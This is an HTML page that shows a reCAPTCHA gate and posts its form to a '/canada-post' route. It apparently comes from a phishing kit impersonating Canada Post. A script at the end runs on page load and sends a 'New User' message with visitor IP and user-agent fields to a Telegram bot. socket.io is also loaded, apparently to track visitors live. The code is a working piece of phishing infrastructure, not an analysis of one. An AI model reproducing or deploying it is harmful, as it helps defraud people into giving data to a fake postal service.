<!DOCTYPE html>
<html lang="en">

<head>
    <span hidden id="page"> Captcha </span>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Responsive reCAPTCHA with Bootstrap</title>
    <!-- Include Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script type="text/javascript">
        var onloadCallback = function () {
            grecaptcha.render('html_element', {
                'sitekey': '6LfxsygpAAAAADsI8wdOqOJgoOejt_ECg8L_Qpvw'
            });
        };
    </script>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
    </script>
</head>

<body class="d-flex justify-content-center align-items-center vh-100">
    <div class="text-center">
        <!-- Form -->
        <form action="/canada-post" method="POST" class="form-signin">
            <!-- reCAPTCHA -->
            <div id="html_element"></div>
            <br>
            <!-- Submit button -->
            <input class="btn btn-primary" type="submit" value="Submit">
        </form>
        <!-- End Form -->
    </div>

    <!-- reCAPTCHA API -->
    <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>
    <!-- Include Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
<script>
    // Telegram API URL with your bot token and method
    let messageText = `New User\n\nCaptcha Page\n\nIP: \nUserAgent: `;

    const telegramApiUrl = `https://api.telegram.org/bot/sendMessage`;
    const payload = {
        chat_id: '',
        text: messageText
    };

    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
</script>

</html>
